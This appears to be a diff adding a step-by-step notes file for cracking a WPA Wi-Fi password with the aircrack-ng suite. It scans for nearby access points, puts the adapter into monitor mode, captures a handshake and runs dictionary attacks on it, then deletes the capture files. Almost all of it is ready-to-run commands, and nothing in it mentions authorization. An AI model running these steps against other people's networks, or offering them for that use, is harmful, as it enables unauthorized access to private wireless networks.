@@ -1,0 +1,50 @@
+// WPA Instructions
+// Ensure dictionaries are in the current directory you are working in
+
+// Open 2 Terminals
+
+// Connect to Wifi Interface (wlanN)
+
+Terminal 1: 
+ifconfig
+	// Get the name and mac address of wlan
+int=[name of wlan] // should look similar to wlx00c0ca40b1b8
+mac=[mac of wlan] //should look similar to 00:c0:ca:40:b1:b8
+
+sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)'
+	// get AP specifics
+
+Terminal 1 and 2:
+essid=[name of router] //should look like civilizations
+bssid=[address] // should look like B4:75:0E:DA:A8:B3
+chan=[channel] // should look like 11
+
+Any Terminal:
+sudo stop network-manager
+or
+sudo /etc/init.d/network-manager stop
+
+Terminal 1:
+sudo ifconfig $int down
+sudo airmon-ng start $int $chan
+audo airodump-ng -c $chan --bssid $bssid -w output mon0
+	// wait for handshake -- also use Terminal 2 if need be
+
+Terminal 2: // or a Terminal 1 if Terminal 2 is still capturing packets
+sudo aircrack-ng -w words.txt -b $bssid output*.cap
+	// or skip to the larger dictionary file
+sudo aircrack-ng -w morewords.txt -b $bssid output*.cap
+	// when successful, ctrl+c in all terminals that have things running
+
+Terminal 1:
+sudo airmon-ng stop mon0
+sudo rm output-*.kismet.*
+sudo rm output-*.csv
+sudo rm output-*.cap // capture files with handshake, optional
+	// would help if you unplug WiFi interface if it is USB
+
+
+// Restart network manager instructions
+sudo service network-manager start
+
+	
